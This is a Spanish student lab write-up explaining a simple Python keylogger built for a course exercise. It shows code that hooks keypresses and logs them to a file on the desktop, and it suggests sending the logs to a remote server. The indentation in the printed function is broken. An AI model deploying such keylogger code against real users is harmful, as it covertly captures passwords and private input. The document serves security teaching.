# ⌨️ Práctica 1: Creación y Detección de un Keylogger en Python, Explicación AEH
En este documento explicaré como he realizado la práctica aquí explicada: https://github.com/creyaro/SI_T5_P1

## ✅ ¿Cómo funciona el keylogger?
Explicaré mi keylogger por líneas:
  1. Importar la librería que vamos a utilizar.
     
     ```python
     import keyboard
     
     ```
  2. Haremos una función que escriba la tecla que ha pulsado el usuario rodeada por espacios para una mejor interpretación del output.
     
     ```python
     def on_key_event(event):
     f = open('C:\\Users\\PC03\\Desktop\\keylog.txt', 'a')
     if event.name == 'space':
         f.write(' ')
     f.write(str(event.name))
     if event.name == 'space':
         f.write(' ')
     
     ```
  3. Utilizar la función "on_press", para registrar la tecla que pulse el usuario.
     
     ```python
     keyboard.on_press(on_key_event)

     ```
  4. Utilizamos la función "wait" para esperar a que se pulse una tecla para finalizar el script en este caso la tecla "esc".
     
     ```python
     print("Presiona cualquier tecla. Pulsa 'Esc' para salir.")
     keyboard.wait('esc')

     ```

## 🆙 Áreas de mejora del keylogger
  ### Mejoras de lectura
  Esta mejora consiste en hacer que el texto que recogemos en el archivo de texto sea más legible, ya están implementadas algunas mejoras de legibilidad, pero igualmente se podría hacer que el texto fuese más legible y no escribiera comandos todos juntos como por ejemplo los "space" o "esc".
  
  ### Mejoras de envío de información
  La información podría ser enviada a algún equipo remotamente o a algún servidor mediante un archivo JSON.
  ### Mejoras de funcionalidad
  Podría tener más funciones como por ejemplo, hacer que registre el tiempo de pulsación de las teclas, darle un nombre concreto al evento o darle un ID.
  
## ⏺️ ¿Cómo usar el keylogger?
  El keylogger funciona de una forma muy simple, ejecutas el archivo .py y el script ya estará funcionando, este registrara todos los eventos que realicemos por teclado y los guardará en un archivo llamado keylog.txt ubicado en el escritorio.
